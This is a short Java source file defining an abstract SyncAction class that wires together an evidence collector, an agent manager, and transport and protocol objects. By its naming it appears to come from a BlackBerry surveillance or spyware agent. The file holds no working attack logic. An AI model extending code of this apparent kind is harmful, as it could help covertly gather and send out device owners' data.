package blackberry.action;

import blackberry.AgentManager;
import blackberry.action.sync.Protocol;
import blackberry.action.sync.Transport;
import blackberry.evidence.EvidenceCollector;

public abstract class SyncAction extends SubAction{        
    protected EvidenceCollector logCollector;
    protected AgentManager agentManager;
   // protected Transport[] transports = new Transport[Transport.NUM];
    protected Transport transport;
    protected Protocol protocol;
    
    public SyncAction(int actionId) {
        super(actionId);
        logCollector = EvidenceCollector.getInstance();
        agentManager = AgentManager.getInstance();
    }

}
